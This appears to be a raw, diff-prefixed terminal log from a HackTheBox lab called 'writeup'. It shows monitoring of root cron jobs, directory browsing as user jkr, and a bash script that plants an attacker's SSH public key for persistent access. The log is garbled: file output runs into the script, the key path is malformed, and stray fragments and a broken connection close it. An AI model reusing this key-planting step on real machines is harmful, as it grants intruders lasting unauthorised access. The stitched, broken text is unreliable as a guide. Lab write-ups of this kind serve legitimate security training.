+2020/01/05 23:01:01 CMD: UID=0    PID=14367  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:02:01 CMD: UID=0    PID=14368  | /usr/sbin/CRON                        
+2020/01/05 23:02:01 CMD: UID=0    PID=14369  | /usr/sbin/CRON                        
+2020/01/05 23:02:01 CMD: UID=0    PID=14370  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:02:35 CMD: UID=0    PID=14371  |                                       
+2020/01/05 23:03:01 CMD: UID=0    PID=14372  | /usr/sbin/CRON                        
+2020/01/05 23:03:01 CMD: UID=0    PID=14373  | /usr/sbin/CRON                        
+2020/01/05 23:03:01 CMD: UID=0    PID=14374  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:04:01 CMD: UID=0    PID=14375  | /usr/sbin/CRON                        
+2020/01/05 23:04:01 CMD: UID=0    PID=14376  | /usr/sbin/CRON                        
+2020/01/05 23:04:01 CMD: UID=0    PID=14377  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:05:01 CMD: UID=0    PID=14378  | /usr/sbin/CRON                        
+2020/01/05 23:05:01 CMD: UID=0    PID=14379  | /usr/sbin/CRON                        
+2020/01/05 23:05:01 CMD: UID=0    PID=14380  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+2020/01/05 23:06:01 CMD: UID=0    PID=14381  | /usr/sbin/CRON                        
+2020/01/05 23:06:01 CMD: UID=0    PID=14382  | /usr/sbin/CRON                        
+2020/01/05 23:06:01 CMD: UID=0    PID=14383  | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1                                                                             
+^CExiting program... (interrupt)          
+jkr@writeup:/tmp$ cd /var/www             
+jkr@writeup:/var/www$ ls                  
+html                                      
+jkr@writeup:/var/www$ cd html/            
+jkr@writeup:/var/www/html$ ls             
+index.html  robots.txt  writeup           
+jkr@writeup:/var/www/html$ cat robots.txt 
+#              __                         
+#      _(\    |@@|                        
+#!/bin/bash                               
+
+touch /tmp/arrow                          
+mkdir ~/.ssh                              
+
+
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDnpxdnOufCRjURqeyxy3OERv6TeE98cexypkyhRWL48wA8grwLsAAayZrYe1IjN7Hz90aqw9mJe87lSvMkTTEijMt9M+L9UQEJ73UnMI36tmdQdPtodK3zPZo4m9FQn
+oeXP/OBoQMvA6mTTOG3OOY+0fKKau0U/cr+dL7d+zcqU84+p3S+gXFkY4PW7OnQvVZlBfk1Xd1FmB9Q814q+46NLVMPzluMabeFRaRP0ep1c0JUiN1YiAiFKSP6rW8RvVX2IO/CjSOIInyNU9XpmHXdMoerx7zegPdMgU3LF6HU
+5IOFppuHVsPiCN7zMjnJnaQAc4SWxPd3EXpJ+lS7+tCl10fwC3bLb6BtzTCdaD9kRwqKHo96w3agcy1pTF68eQVO6w9Q+pZTQ79CJrdOkyHdfw/UDxV5GGPp9W7ijdtSoK559X4s7SoJ1Kv6da26g6OVtIdRNH3LNbvQjNuh+5z
+BhyhKs3ApMHUETGCrdd/r9qDs2gejiqrRBCqGhJ/MXRU= root@parrot' >> ~/.ssh_authorized_key                                                                                        
+
+client_loop: send disconnect: Broken pipe 
+┌─[✗]─[root@parrot]─[~/hackthebox/writeup]
+└──╼ #                                    
+C                                         
+C                                         
+C                                         
+C                                         
+C                                         
+C                                         
